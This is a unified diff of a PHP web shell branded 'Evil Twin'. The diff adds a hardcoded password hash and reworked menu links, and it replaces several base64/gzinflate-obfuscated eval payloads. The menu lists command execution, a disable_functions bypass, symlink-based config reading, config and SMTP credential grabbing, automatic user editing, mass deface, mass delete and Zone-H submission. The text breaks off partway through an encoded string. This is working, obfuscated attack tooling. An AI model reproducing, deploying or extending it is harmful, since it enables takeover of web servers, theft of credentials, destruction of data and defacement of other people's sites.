@@ -1,4 +1,5 @@
 <?php
+$auth_pass = '1ce078f22a61442f2477cf8a3270abb1'; // MD5 : Evil_Twin
 @error_reporting(0);
 @set_time_limit(0);
 	if(version_compare(PHP_VERSION, '5.3.0', '<')) {
@@ -39,11 +40,12 @@ if(!empty($auth_pass)) {
 echo '<!DOCTYPE HTML>
 <html>
 <head>
-<meta name="robots" content"noindex. nofollow">
+<meta charset="UTF-8">
+<meta name="robots" content="NOINDEX, NOFOLLOW">
 <meta name="theme-color" content="#434343">
-<title>• Evil_Twin •</title>
+<title>Evil Twin</title>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Play&display:swap;" type="text/css">
-<link rel="icon" href="https://i.ibb.co/QjwrL9y/Sec666-Fadly31337.jpg" type="image/jpeg">
+<link rel="icon" href="https://i.ibb.co/WBN9fzL/logo.jpg" type="image/jpeg">
 <style>
 body{
 font-family: "Play";
@@ -62,12 +64,12 @@ padding:6px 6px;
 border-radius:6px;
 }
 .pejoe:hover {
-background-color:#ADADAD;
+background-color:#BDBDBD;
 color:#000;
 }
 .we {
 color: red;
-font-size: 35px;
+font-size: 33px;
 text-shadow: 0px 1px 0px #848484;
 }
 table{
@@ -81,15 +83,15 @@ a:hover{
 color:white;
 }
 input,select,textarea{
-border: 1px #FFFFFF solid;
--moz-border-radius: 5px;
--webkit-border-radius:5px;
-border-radius:5px;
+border: 1px #7B7B7B solid;
+-moz-border-radius: 4px;
+-webkit-border-radius:4px;
+border-radius:4px;
 }
 </style>
 </head>
 <body>
-<center><span class="we"><a href="mailto:fadly.randovlsky@gmail.com">• EVIL TWIN SHELL •</a></span></center>
+<center><span class="we"><a href="?">EVIL TWIN</a></span></center>
 <table width="780" border="0" cellpadding="3" cellspacing="1" align="center">
 <center><tr><td><font>Path :</font> ';
 if(isset($_GET['path'])){
@@ -128,41 +130,31 @@ $path = getcwd();
 }
 $path = str_replace('\\','/',$path);
 $paths = explode('/',$path);
-
-if(isset($_FILES['file'])){
-if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-echo "<script>alert('OK');<script>";
-}else{
-echo "<script>alert('ERROR!');</script>";
-}
-}
-echo '<form enctype="multipart/form-data" method="POST">
-<font>File Upload :</font> <input type="file" name="file" />
-<input type="submit" value="Upload" />
-</form>';
 echo "<hr><center>
-<a href='?evil_twin=?' class='pejoe'>HOME</a>
-<a href='?evil_twin=bypdisf' class='pejoe'>DISABLE FUNCTIONS</a>
-<a href='?evil_twin=info' class='pejoe'>INFO</a>
+<a href='?path=$path&evil_twin=upload' class='pejoe'>UPLOAD</a>
+<a href='?path=$path&evil_twin=bypdisf' class='pejoe'>DISABLE FUNCTIONS</a>
+<a href='?path=$path&evil_twin=info' class='pejoe'>INFO</a>
 <a href='?evil_twin=cmd' class='pejoe'>CMD</a>
-<a href='?evil_twin=sym' class='pejoe'>SYM</a>
-<a href='?evil_twin=sym403' class='pejoe'>SYM403</a>
-<a href='?evil_twin=sym404' class='pejoe'>SYM404</a>
-<a href='?evil_twin=symconf' class='pejoe'>SYMCONF</a>
-<a href='?evil_twin=vhost' class='pejoe'>VHOST</a>
-<a href='?evil_twin=jumping' class='pejoe'>JUMPING</a><hr color=#1E1E1E>
-<a href='?evil_twin=edituser' class='pejoe'>AUTO EDIT USER</a>
-<a href='?evil_twin=config' class='pejoe'>CONFIG</a>
-<a href='?evil_twin=domains' class='pejoe'>DOMAINS</a>
-<a href='?evil_twin=mass_deface' class='pejoe'>MASS DEFACE</a>
-<a href='?evil_twin=mass_delete' class='pejoe'>MASS DELETE</a>
-<a href='?evil_twin=smtp' class='pejoe'>SMTP GRABBER</a>
-<a href='?evil_twin=zoneh' class='pejoe'>ZONE-H</a>
+<a href='?path=$path&evil_twin=sym' class='pejoe'>SYM</a>
+<a href='?path=$path&evil_twin=sym403' class='pejoe'>SYM403</a>
+<a href='?path=$path&evil_twin=sym404' class='pejoe'>SYM404</a>
+<a href='?path=$path&evil_twin=symconf' class='pejoe'>SYMCONF</a>
+<a href='?path=$path&evil_twin=vhost' class='pejoe'>VHOST</a>
+<a href='?path=$path&evil_twin=zoneh' class='pejoe'>ZONE-H</a><hr color=#1E1E1E>
+<a href='?path=$path&evil_twin=jumping' class='pejoe'>JUMPING</a>
+<a href='?path=$path&evil_twin=edituser' class='pejoe'>AUTO EDIT USER</a>
+<a href='?path=$path&evil_twin=config' class='pejoe'>CONFIG</a>
+<a href='?path=$path&evil_twin=domains' class='pejoe'>DOMAINS</a>
+<a href='?path=$path&evil_twin=mass_deface' class='pejoe'>MASS DEFACE</a>
+<a href='?path=$path&evil_twin=mass_delete' class='pejoe'>MASS DELETE</a>
+<a href='?path=$path&evil_twin=smtp' class='pejoe'>SMTP GRABBER</a>
 <hr></center>";
-if($_GET['evil_twin'] == 'info') {
+if($_GET['evil_twin'] == 'upload') {
+eval(gzinflate(base64_decode('jZBbS8MwFIDfB/sPWRykA10QfBDWBgQ7EQcZnT4NGbFLaSA30lNhyP67TWfxBuI5L+fy8XE4qkpU00hIprvl/SrfbEmltCTPs9nbeKSqpHT+8HO3JWD8zgrT1edTL6CeE0rmv6gT0ZtkWTuE01JakIGllbOASqddyM6WfbCn9Yrf3CL+kNK4ZSkd4DoM6GUek+HFeHSUupF/i6+vYg7ivCh4Mfmn/PghJl/EwSBpSzh4mWHTalBeBKBxfrEXIDAyEmq3z/Cabx4xS5X1LaATHz+CUfzHUNPvQNO+GAUYvQrddu0dn+CO6O2fx5LFOw==')));
+} elseif($_GET['evil_twin'] == 'info') {
 eval(gzinflate(base64_decode('S03OyFdQt0nLzyuxC64sLknNVbBSsNEH88GiCsn5OflFtspOBiBop66nUlxZrKduk1RkB1XGywXR7hlAUGtmAVadwYlpqQq++SmphO3OxWqAS2ZxYlJOaoqCW2lecklmfl4xQZNSivNSM7Aa5pGfm6oQlJ9fQtCMDKDK+CIUQ9StAQ==')));
 } elseif($_GET['evil_twin'] == 'cmd') {
-eval(gzinflate(base64_decode('VZDBSsQwEIbvhb5DKMLowa0ieNg2uYhnBb2JSNrMboNNUtqpu1V8dyfbrdDLMPPPJPP9g3UTRFbW6Al7Ve5C74RDaoKR0IWBQKUJq55EHdrQSzg0lhDUQ3BOeyO2ZR67ccr6biRBU4cSCI8EYrDfnN/dgGjQ7huScMu5147V2hlQqzfDWDlLSx+PGEfEl25HLsUj1yOhOAHlkVOVOZkYmDs/G8iKNLG7y4uP56eX17flk/cr8ZMmuLYaEXWPOhobJNwzWR8Ow8zIugm+nSQsGbuhqY3g8Q7bqtX1Z1Fx2Pdh9OZ6lk/XKUBlG179jzEzbDJmPS9dE//+AQ==')));
+eval(gzinflate(base64_decode('VU/LqsJADN0X+g+hCPFurOJO29mIawXvTkRqG+8MODOlTX1c8d/N+AI3IecVcqjUHpKsJMfUqGzvGwuWWPsqx9q3jCqOhHUMpT/4JseTNkyoZt7awlUwydKgBpdxdcfAl5pyZDozQmv+ZR8PETSZP805jmR3hRW2tBWqr0zb7azht05nChY4FodOIMwFd0zweCgNf6pkGkdm3+9tl4vV7/qd2PzANY7o2atuSCUDUT6up2WQZClXSoaUTl/tw73bHQ==')));
 } elseif($_GET['evil_twin'] == 'config') {
 eval(gzinflate(base64_decode('rZZtb5swEMdfM2nfwUORQqYkbK8qtU2q9UGaprWdVml9UVXoABPcGuzZTkm05rvvDKSQtKuoligJBt/9/Pf5zLlHTUQmJBGS5p7r450vQesidofEVe6ACEViRj33MBG5IZHgQk0UjacnkPcNURRi0vI69K3Z1B0cvH/n9Fi8QHZ2HzPlufSBcVOwPIhEniD9097eXm2mWZCWMtxLaZjINQHO85/095wpSi5ETvMrMEwnS/IlX7qlU9rWvcH2x6mBKKJau0O3qKQkhWKGetZrSNYDlj1Fyjh2VPItcUaN9no4pcGA/EEDhyVNN0p0yeMj+VAaVP0OjVJB3hggO7SzIpRrWlOkorMgAxOlAc7e6/ve+OPRYH+x7/dRcuWNjbmmqpwmm5X6HScROEiUeu2um8+3BDTp2cAENjJrrU7bKsCFsVH3U5FRvzH25TzkLMIYZdyvpJZhYDqw84HQRmyLM3gawenNFIR1F+JBKVh6dZ/zfLBxthxHmBJkMiVuJCGn3B2+Yl6tbQo6rVyuv56PWs9ecW1PS4oRKjQ0N36ldCxTWQF/CCnuWFfQQyyCbcIvIWIhuhLCYlQB9FoKy1kFOhb6moZdQZW3f48b5l6zRs53cY9eMYOuIL522B0y4gxjDZg/NXOuwO71BonreHLVFVek2a44kd4JCbfhPHuWS9g4Pu6K0PiO0n5ME5hz42tqDMtnuoGdqrmEVzfHC9nwhGF51MpxRbWBq1TIrjiQsnyPcREBHy8yXoHOYYbr2jnX74TI+D9T4FvZ+7YJ/iekkPgdbS/btVCxDZHujEEHaR12Q9sBA+IMn2xjLrFenoAynVOSbxOuMEnx/fCGtMF2uUTrjIzBQAiaNswzzpnmELp1SWsVtXYtsRVtXVampJdDButS+FR8nB5kIQp5Kj8J1vcAi3pQv+6xuG+Uz6q0bXlNSL/fYm4U6nKQktqM8dIxpAnIqC11bBamOZhUn0TOra4WdLghqDFd1Y36unKcslHermzbtuoDSaimhxHOmOIVSKpoMukfSTDppGf//Q25/Wl5gJnekNPLizNyWx9UDn3AX01xD/4C')));
 } elseif($_GET['evil_twin'] == 'zoneh') {
@@ -170,7 +162,7 @@ eval(gzinflate(base64_decode('pVRdT9swFH0uEv/BihAuUiEgjZfSREKjSNMQRWl5WlGVJre1hW
 } elseif($_GET['evil_twin'] == 'sym') {
 eval(gzinflate(base64_decode('7Vdta9tIEP5u8H+Ybl0kXVzJTukVYsuX0uS4wl0DTXp3kBQjS6tI1/Wu2F1HcdP895tdSY5rOQ6lhVKoPxhp3nd25plRL10wBiEoLaeSFiyKqdubnh6//fv47blzdPLq3V/Hb86mb09Ozpz3fSCkD70i0pk36nZ6yWAe5Vyh+mGaM+qSgOo44NGcJn4seEqMVJ66jaB30+0czj8kuXQJvcqZLnM+Vcs56Q9evHhhhA/jrM21DHqN9hmHpwoCaNiW1TO+n2EQzkmhc4HxvOYJiiv4XTAmytPl/M+cf1DdzlEuaayFXFqBlRU/0/Nu52WSnC0LCppe6wATkXPwi6wAy/kj4gmjcpPZ7ZxGOlfpEl7ypWNjKUwkqSgodx00HMUxVcrpO6VTxVpafilzjYlG6X4Vvjc6TGMmVEU0ojTOBJBuZ6yjGaMQsfyShzHlGsOYCZlQGQ7x2paMhk6ZJzo7+HXwZFRxnsaCCXnw+Jn9jZyJMSPtf/KZpck4FVyDyj/ScH9y6sMb4Y8DQ5uMA508qHEk7MV+ico7ReUXKeD9Mby/DZUAz0NsEcZigcIhDPEtFZJGcbaqOIgU1M+m+LAWqaSXuUs+Ck5Jv2F5NwWSp/NIx9k0Ysx1HhsBIK7/i0ceO/3GiHmojmyuKGULlbl1kWMHMbx0LfO52widD9+fD957Hkxg3/jvLfDwGGohVH49vaS6KBd54truESWnsm6hK8xGpKgKiL9palUZeKEbScPEfJY4Aj406fFR4Z6cM5oiNYJM0jTMtC4OgqAsS3/Tt0+C2n7MIqVCfa0nbZmVl2jNk5EzRz93DDg4VmzFa1w7600fNC9BJuY0aOkHxWLG8niKrcsc0JHEZIbOdMYi/sFphblZQnVsdRHB+k3WCdvbG93e3q5yHdgmtAV3S5mi5i7Pjk/Pwgr4HHtrBborE6eqB3CtwFdA3o+BePAQ5MEOzEPuJuxBg3uwC/gmFZzBLuR4thXPHlDZgk4POWnD0wqc4HN0AnvuVbLIWtXgXCWSeCAk0Otcu+Qdt6fXAowsGMVH9vKhzEzJPUqpwMlq6J4pMuiZOZxiG6iaah1aSKOGFUkZLd2KagK6Qzws34sAke437+LgIgiUgTvVX+luGlpfFUjVnX3cCxoJBAKrcQeJK0MIg8N9+PQJWowwhIFh3LkJgcyw3FtEk7J/h8MgVW3eVSQDls8Cfh8zkkVpSNu5l6LIqGzz1NZArL1k3mYsFJpCmLonhlQX20/FtzGMBoLxdobdtIiHycZtS+d8Qe8ayDTI7rnaGg87q30N841eE0qjSNY9P2CgAfxdeL/hYx3uW2i/6sDonvYzYL6CmaY1NpG9wnWzrQoFjzDD/+Q8EaUi3s0uAL8Hvu/dV++wG2P4vvDd7Xw1gO9A7ww3NyqvMIb6fqgcB0j8Jsj++ui7orqm8wIzQsioh6vaEB8H9mnfAP1gMDBCuIq6NXscguVWr3t7Htz0cO8z300bm6AVqOETNwgkeZUzP4T/RI73c+D0LdknFxyLtkm5M57JYOKMmtCqNdS81CX3HIk2Kjt5NFXax15E5C6rqZIWi2ZyPO/Xioa81jbP0dTaPGuG2TarXzXM2pPs24yxnzPs5wz7oWfYRj9uGWPjIMmv8L+OmowW3Jhda02rdAtm2MGd+jYIfBVxLvDM+EWtKWwCYqMxq8O8tWbx9z8=')));
 } elseif($_GET['evil_twin'] == 'sym403') {
-eval(gzinflate(base64_decode('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')));
+eval(gzinflate(base64_decode('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')));
 } elseif($_GET['evil_twin'] == 'jumping') {
 eval(gzinflate(base64_decode('1Vhbb9s2FH72gP2HM8aA5DUzswF9cSx12PbSYcCGbcAe0kCgJcpiphtIynKw5r/vUNSFvrVF0A5dglgSz4Xnwu/zUeYCAri5/fKLGY+zCsg6ETuIc6ZU4BVMbkW5gpf1Hlijq1svJEZTpH4t+TYqmI4zn9BM1RmXnJJrmCdCLhbwD2rN5o3MFXrn+zqvEu6TN/JNaXSi33794887D8Xe/cI4NB6FUlz7g+yhKWoU9p6G2HBXG8FsllaSM9zdbsIUmJtBvdsad1ZaRpLXOYu5z6Rkjz7JtK5XFEMlbdsuyeIaCIaEirrKq5bLzuHCRoV+uI7RD6F4pTUWpU3IIEpRkFY1L32jdU0kGazaTOTcn2+5Numn5urP0zEZtK15zDK3NCtTF6M4+MAUFJeoYnXvbu5HAZY46oVT7fMqZjnNqoLTznII05Y2Qht/NFxAEASgZcOnkLqSDW5HzSWhZGkkg7feHdY+YRuT5GDlZIe+xIsXt9PTg2xNrHfrtCo1xFhoGVz9cGN+w9/X1KyG97BmkEmeBt6rmuksGD174Tm7UdzbrykLybSnDbOVQr8jzPdE9tenCe1pvOtOtYlhSdYb6egMKv3VXp56oMwRsQhZTATMyhPwXPFDnKCz1yXoSrMctDkewPAPOymWBFDyTdg91N2Gnd/ekE4IO/XrrWNeai5DGxUAJi8LKLjOqiQgdaU0GWW/CKXhp6pgolQrMBGNVprvNcbDoGQFDwhWiyAAH3O8b0WiMyScm5t6fwsZF9tMr+C7l+aRhJ4t0DytR+gdAyCuylRsqUF5QpXQXNnPpd5r4mDUgaiL0Xo6H7Y5ncLtVH+7jKWgQxbhQW6irBsN+rHGZFSzKYQmsGN5g48/I6WJckv6tA3DvTfvLu3ROTX1xuPUt8Eb22d7dUzLuww7oj4nVm75JtplHW/tmKTIwEOQRs92rYrVAASHuqzlOeI6JqRe02U2l42eSUbW6wW8W+FZtB/z0Gl0zyah54Y08s8l+vmErAOJ+D8zD/rYIIR9IuoVJjGQyWfMCbaKJ0Dt55qBQ53pBuchJEmoJLYKyeHc4fqRlZ4GgzhwLPuz1tek51crmggW1cezbw7VIA/A8+DtW/iq0zig4GeE0PO1e4xmEzNGLM99j/rLr18tVvsV9ZD7rD3emK/t6MF2ZRjFJlJzhHff3nf8VjyOq85852oaArO